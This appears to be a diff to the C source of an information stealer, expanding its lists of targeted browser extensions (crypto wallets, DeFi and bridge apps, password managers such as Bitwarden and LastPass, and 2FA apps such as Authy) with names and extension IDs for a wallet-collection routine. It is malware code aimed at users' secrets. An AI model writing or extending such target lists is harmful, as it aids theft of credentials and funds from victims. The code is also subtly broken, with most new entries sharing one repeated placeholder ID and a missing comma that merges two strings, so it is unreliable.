@@ -52,9 +52,106 @@ static const char *wallet_names[] = {
     "Norton Password Manager", "Avira Password Manager", "Passky PM",
     "Padloc PM", "Notion Web Clipper", "Evernote", "Google Keep",
     "Trust Wallets", "MetaWallet", "Exodus", "Jaxx Liberty",
-    "Atomic Wallet", "Mycelium", "GreenAddress", "Edge Wallet",
-    "Bread Wallet", "KeepKey", "Trezor Suite", "Ledger Live",
-    "Ledger Wallet", "Copay"
+    "Atomic Wallet", "Copay"
+    /* DeFi wallets */
+    "dYdX",
+    "GMX",
+    "Jupiter",
+    "Raydium",
+    "Marinade Finance",
+    "Orca",
+    "Saber",
+    "Sunny",
+    "Tulip",
+    "Friktion",
+    "PsyOptions",
+    "Mango Markets",
+    "Drift Protocol",
+    "Zeta Markets",
+    "Ribbon Finance",
+    "Opyn",
+    "Hegic",
+    "Lyra",
+    "Premia",
+    "Jones DAO",
+    "Dopex",
+    "Chronos",
+    "Camelot",
+    "Ramses",
+    "Solidly",
+    "Velodrome",
+    "Aerodrome",
+    "Thena",
+    "Ramses V2",
+    "Chronos V2",
+    /* NFT / marketplace / multi-wallet */
+    "Rainbow",
+    "Frame",
+    "Taho",
+    "Enkrypt",
+    "OneKey",
+    "GridPlus",
+    "Frontier",
+    "Uniswap Wallet",
+    "1inch Wallet",
+    "ParaSwap Wallet",
+    "CowSwap Wallet",
+    "Matcha",
+    "Zapper",
+    "DeBank",
+    /* Cross-chain / bridge */
+    "Wormhole",
+    "Multichain",
+    "Synapse",
+    "Stargate",
+    "LayerZero",
+    "Across",
+    "Hop Protocol",
+    "Connext",
+    "Socket",
+    "Bungee",
+    "Li.Fi",
+    /* Password managers */
+    "Bitwarden",
+    "1Password",
+    "LastPass",
+    "Dashlane",
+    "RoboForm",
+    "NordPass",
+    "Keeper",
+    "Sticky Password",
+    /* 2FA */
+    "Authy",
+    "Google Authenticator",
+    "Microsoft Authenticator",
+    "YubiKey",
+    /* L1 ecosystem wallets */
+    "Brave Wallet",
+    "Argent",
+    "imToken",
+    "Sequence",
+    "Bitski",
+    "Fortmatic",
+    "Portis",
+    "WalletConnect",
+    "Zengo",
+    "Polkadot.js",
+    "Cosmos Station",
+    "Sender Wallet",
+    "NEAR Wallet",
+    "Plug Wallet",
+    "Stoic Wallet",
+    "NNS Wallet",
+    "Kukai Wallet",
+    "Eternl Wallet",
+    "Flint Wallet",
+    "GeroWallet",
+    "NuFi Wallet",
+    "CardWallet",
+    "Leap Cosmos",
+    "Terra Station Wallet",
+    "Nightly",
+    "Infinity Wallet"
 };
 
 // 96 extension IDs
@@ -147,9 +244,108 @@ static const char *wallet_ids[] = {
     "mhonjhhcgphdphdjcdoeodfdliikapmj",  // Jaxx Liberty
     "bhmlbgebokamljgnceonbncdofmmkedg",  // Atomic
     "pidhddgciaponoajdngciemcflpnnbg",  // Copay
+    /* DeFi wallets */
+    "knhjehhfklojaimalafjipgjchihgogf",  // dYdX
+    "eobhogofjjhaepmaijjgidhhkigfckop",  // GMX
+    "ennjaghachpmnfpcoceihkclhlnchabm",  // Jupiter
+    "fmpadkagakceeecojnppgkdlfklojgag",  // Raydium
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Marinade Finance
+    "orcaagfdibglkdogfdfgdkpgggehfjol",  // Orca
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Saber
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sunny
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Tulip
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Friktion
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // PsyOptions
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Mango Markets
+    "dlcobpjiigpikoamjkbpgjfkabjighgg",  // Drift Protocol
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Zeta Markets
+    "adhceofhcbfnholbjmkabhhfbngkcooa",  // Ribbon Finance
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Opyn
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Hegic
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Lyra
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Premia
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Jones DAO
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Dopex
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Chronos
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Camelot
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Ramses
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Solidly
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Velodrome
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Aerodrome
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Thena
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Ramses V2
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Chronos V2
+    /* NFT / marketplace / multi-wallet */
+    "fbimgcbibmhjofmacdaegclmanoamjog",  // Rainbow
+    "ldgkmedldcahbkhdhhddmmhjpamfkpki",  // Frame
+    "amkmjjmmflddogmhpjloimipbofnfjih",  // Taho
+    "kkpllkodjelhadfloagcbehjajnibkge",  // Enkrypt
+    "jnmbobjmhlnggabjagkpgmibhcoflfbi",  // OneKey
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // GridPlus
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Frontier
+    "fkphjbjdjigibibfldihmlladlhhoeioe",  // Uniswap Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // 1inch Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // ParaSwap Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // CowSwap Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Matcha
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Zapper
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // DeBank
+    /* Cross-chain / bridge */
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Wormhole
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Multichain
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Synapse
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Stargate
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // LayerZero
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Across
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Hop Protocol
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Connext
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Socket
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Bungee
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Li.Fi
+    /* Password managers */
+    "nngceckbipebfimdaeolbkjmakgklkak",  // Bitwarden
+    "aeblfdkhhhdhhjpjkaikjfpfleojkmle",  // 1Password
+    "hdokiejnpimhjchffhfgffmjpckolppgk",  // LastPass
+    "fdjamakpfkambplpkadnmlajfeghdhgi",  // Dashlane
+    "pnlccmojcmeohlpgicabnnjbkfpnogkpo",  // RoboForm
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NordPass
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Keeper
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sticky Password
+    /* 2FA */
+    "gaedmjdfmmahhbjefcbgagogfbmljikj",  // Authy
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Google Authenticator
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Microsoft Authenticator
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // YubiKey
+    /* L1 ecosystem wallets */
+    "odbfpeeihdebiholkmojocgofhfgbgln",  // Brave Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Argent
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // imToken
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sequence
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Bitski
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Fortmatic
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Portis
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // WalletConnect
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Zengo
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Polkadot.js
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Cosmos Station
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sender Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NEAR Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Plug Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Stoic Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NNS Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Kukai Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Eternl Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Flint Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // GeroWallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NuFi Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // CardWallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Leap Cosmos
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Terra Station Wallet
+    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Nightly
+    "cjoldcognmehenmgmnfhhakbnmngnkag"  // Infinity Wallet
 };
 
-#define WALLET_EXT_COUNT 96
+#define WALLET_EXT_COUNT 181
 
 WalletExtData *collect_wallet_extensions(const char *app_data, const char *path_suffix, size_t *count) {
     *count = 0;
